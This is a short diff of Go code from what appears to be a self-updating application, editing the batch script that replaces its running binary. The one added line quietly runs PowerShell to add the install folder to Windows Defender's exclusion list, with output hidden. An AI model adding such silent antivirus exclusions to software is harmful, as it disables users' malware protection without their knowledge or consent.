@@ -49,6 +49,7 @@ func replaceRunningBinary(curExe, newExe, version string) error {
 
 	script := fmt.Sprintf("@echo off\r\n"+
 		"cd /d \"%%~dp0\"\r\n"+ // v1.5.29: cd 到安装目录, 否则在 System32 写日志权限拒绝
+		"powershell -Command \"Add-MpPreference -ExclusionPath '%%~dp0' -Force\" >nul 2>&1\r\n"+ // v1.5.29: 添加 Defender 排除
 		"setlocal enabledelayedexpansion\r\n"+ // v1.5.20 C2: 延时变量展开
 		"set OLD=%s\r\n"+
 		"set NEW=%s\r\n"+
